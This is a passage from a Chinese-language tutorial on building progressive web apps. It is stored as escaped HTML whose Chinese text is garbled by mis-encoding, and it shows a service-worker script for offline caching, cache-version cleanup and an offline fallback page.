&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190321/Screenshot_20180418-003023.png&quot; height=&quot;300px&quot; style=&quot;margin-left:5px;&quot; /&gt;

&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190321/Screenshot_20180418-003027.png&quot; height=&quot;300px&quot; style=&quot;margin-left:5px;&quot; /&gt;
&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;æ¨ªå¹…çš„å¼¹å‡ºï¼Œæ˜¯ç”±æµè§ˆå™¨è¿›è¡Œæ§åˆ¶ï¼Œæ¡ä»¶æ˜¯â€&lt;strong&gt;ç«™ç‚¹è¢«è®¿é—®è‡³å°‘ä¸¤æ¬¡ï¼Œè¿™ä¸¤æ¬¡è®¿é—®è‡³å°‘é—´éš”äº”åˆ†é’Ÿ&lt;/strong&gt;â€&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;46-å®ç°åŸºæœ¬çš„ç¦»çº¿å­˜å‚¨&quot;&gt;4.6 å®ç°åŸºæœ¬çš„ç¦»çº¿å­˜å‚¨&lt;/h3&gt;

&lt;p&gt;ç›®å‰æˆ‘ä»¬çš„ &lt;strong&gt;service-worker.js&lt;/strong&gt; æ²¡æœ‰åšä»»ä½•äº‹æƒ…ï¼Œåªæ˜¯åœ¨ç”Ÿå‘½å‘¨æœŸä¸­è¿›è¡Œäº†è¾“å‡ºï¼Œç°åœ¨æˆ‘ä»¬éœ€è¦å®ç°ç«™ç‚¹çš„ &lt;strong&gt;ç¦»çº¿å­˜å‚¨&lt;/strong&gt;ï¼Œä¿®æ”¹åçš„è„šæœ¬å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;&quot;use strict&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;onInstall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;waitUntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CACHE_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addAll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;URL_TO_CACHE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;WORKER: Install completed&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;skipWaiting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;onActivate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[Serviceworker]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Activating!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// è¿™é‡Œçš„&quot;keyList&quot;å°±æ˜¯&quot;var CACHE_NAME = CACHE_VERSION + &quot;:sw-cache::&quot;çš„æ•°ç»„&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;waitUntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keyList&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// è¿™é‡Œçš„&quot;key&quot;å°±æ˜¯&quot;V1.0.1:sw-cache::&quot;ï¼Œæ‰ä¸Šé¢ç¼“å­˜åç§°çš„éå†&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Promise&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keyList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CACHE_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'[ServiceWorker] Removing old cache'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;onFetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// console.log('Fetch event for &amp;gt;&amp;gt;&amp;gt; ', e.request.url);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// è°ƒç”¨respondWith()æ–¹æ³•åŠ«æŒGETè¯·æ±‚å¹¶è¿”å›&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;respondWith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

            &lt;span class=&quot;c1&quot;&gt;// ç¼“å­˜å‘½ä¸­ç›´æ¥è¿”å›&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

            &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;warn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Not in Cache... Making Network request for '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;requet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fetchRequest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fetchRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// æ£€æŸ¥æ˜¯å¦æ”¶åˆ°æ— æ•ˆçš„å“åº”&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'basic'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/offline.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;responseToCache&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CACHE_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cache&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;nx&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;responseToCache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// æ²¡æœ‰æ£€ç´¢åˆ°åº”è¯¥è·³è½¬åˆ°ç¦»çº¿é¡µé¢&lt;/span&gt;
                &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Failed to fetch'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;caches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/offline.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// ----------------------------------------------------------------------&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CACHE_VERSION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;V1.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CACHE_NAME&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CACHE_VERSION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;:sw-cache::&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;URL_TO_CACHE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;/manifest.json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;/offline.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/css/amazeui.min.css&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/css/app.css&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/js/app.js&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/js/jquery.min.js&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/js/amazeui.min.js&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/img/user01.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/img/user02.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;/assets/img/user03.png&quot;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// .....&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// Service Worker äº‹ä»¶æ³¨å†Œ&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;install&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;onInstall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;activate&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;onActivate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fetch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;onFetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä»ä¸Šè¿°è„šæœ¬å¯çŸ¥ï¼Œæˆ‘ä»¬å¯¹ç¼“å­˜å®šä¹‰äº†ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ä¸»è¦å®ç°ç¼“å­˜çš„æ›´æ–°ï¼Œå¦åˆ™å³ä½¿ç«™ç‚¹åšäº†æ›´æ–°ï¼Œç”¨æˆ·åœ¨è®¾å¤‡ä¸Šè®¿é—®çš„è¿˜æ˜¯æ—§çš„å†…å®¹ã€‚&lt;em&gt;URL_TO_CACHE&lt;/em&gt; å®šä¹‰äº†éœ€è¦é¢„ç¼“å­˜çš„åŸºæœ¬ç»“æ„ï¼Œåˆå« &lt;strong&gt;&lt;a href=&quot;https://developers.google.com/web/fundamentals/architecture/app-shell&quot;&gt;App Shell&lt;/a&gt;&lt;/strong&gt;ï¼Œåœ¨ &lt;strong&gt;install&lt;/strong&gt; ä¸­è¿›è¡Œå®‰è£…ï¼Œåœ¨ &lt;strong&gt;fetch&lt;/strong&gt; ä¸­è¿›è¡Œè¯»å–ï¼Œå‘½ä¸­åˆ™ç›´æ¥è¿”å›ï¼Œå¦åˆ™é‡æ–°è¯·æ±‚ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;æ›´å¤šå®Œæ•´çš„ &lt;strong&gt;ServiceWorker&lt;/strong&gt; ç”Ÿå‘½å‘¨æœŸä»‹ç»è¯·å‚çœ‹ &lt;a href=&quot;https://developers.google.com/web/fundamentals/primers/service-workers/&quot;&gt;æœåŠ¡å·¥ä½œçº¿ç¨‹ï¼šç®€ä»‹&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;47-æ¿€æ´»æ›´æ–°äº‹ä»¶&quot;&gt;4.7 æ¿€æ´»æ›´æ–°äº‹ä»¶&lt;/h3&gt;

&lt;p&gt;å½“ç«™ç‚¹çš„å†…å®¹æ›´æ–°å‘å¸ƒåˆ° HTTPS æœåŠ¡å™¨ä¸­æ—¶ï¼Œç”¨æˆ·åœ¨æ‰‹æœºä¸Šè®¿é—®çš„ PWA åº”ç”¨å¹¶ä¸ä¼šå–æ›´æ–°çš„å†…å®¹ï¼Œè¿˜æ˜¯ç»§ç»­ä»æ‰‹æœºç¼“å­˜ä¸­è·å–ï¼Œæ­¤æ—¶å°±éœ€è¦è§¦å‘æœåŠ¡å·¥ä½œçº¿ç¨‹çš„æ›´æ–°ï¼Œä¹Ÿå°±æ˜¯ &lt;strong&gt;Active&lt;/strong&gt; æ¿€æ´»åŠ¨ä½œï¼Œå°†è€çš„ç¼“å­˜åˆ é™¤ï¼Œé‡æ–°ä»æœåŠ¡å™¨ä¸­è·å–æ–°çš„å†…å®¹å¹¶ç¼“å­˜èµ·æ¥ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;æœåŠ¡å·¥ä½œçº¿ç¨‹æ›´æ–°çš„æ¡ä»¶&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
